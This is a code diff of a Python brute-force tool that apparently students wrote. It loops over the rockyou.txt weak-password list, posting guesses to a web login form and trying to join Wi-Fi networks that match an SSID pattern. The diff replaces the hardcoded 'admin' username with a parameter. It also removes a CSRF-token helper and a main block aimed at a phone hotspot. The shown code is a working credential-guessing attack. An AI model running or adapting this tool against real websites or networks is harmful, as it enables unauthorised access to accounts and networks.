@@ -1,22 +1,7 @@
-"""
-@author: Duy Vuong & Skochilov Ignat
-brute_force.py
-
-
-"""
-
 import requests
-from bs4 import BeautifulSoup
 from wifi_connect import connect_network_windows, profile_exists, run, get_default_gateway, scan_networks_windows
 
-IP =  "http://127.0.0.1:5000"
-
-def get_csrf_token(response) -> str:
-    soup = BeautifulSoup(response.text, 'html.parser')
-    csrf_token = soup.find('input', {'name': 'csrf'})['value']
-    return csrf_token
-
-def brute_force_pass_site(api_url: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
+def brute_force_pass_site(api_url: str, default_sitelogin: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
     try:
         with open(path_weak_pass, 'r', encoding='utf-8') as file:
             weak_passwords = file.read().splitlines()
@@ -25,16 +10,10 @@ def brute_force_pass_site(api_url: str, path_weak_pass: str) -> tuple[requests.S
     except UnicodeDecodeError:
         ValueError(f"Could not decode file {path_weak_pass}")
 
-    # truy cập vào ip và lặp các mật khẩu để đăng nhaap
     for password in weak_passwords:
         session = requests.Session()
-        # try:
-        #     response = session.get(api_url, timeout=3)
-        # except requests.RequestException as e:
-        #     return None, None
-        # csrf_token = get_csrf_token(response)
         data = {
-            "username": "admin",
+            "username": default_sitelogin,
             "password": password
         }
         response = session.post(api_url, data=data)
@@ -83,14 +62,6 @@ def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> tuple[str|No
                 print(f"[-] Error connecting with password {password}: {e}")
 
     return None, None
-
-
-
-if __name__ == "__main__":
-    ip = brute_force_pass_wifi("Redmi Note 11", "rockyou.txt")
-    # api_url = f"http://{ip}:8080/gate"
-    # session, csrf_token = brute_force_pass_site(api_url, "rockyou.txt")
-    # print(session, csrf_token)
 
 
 
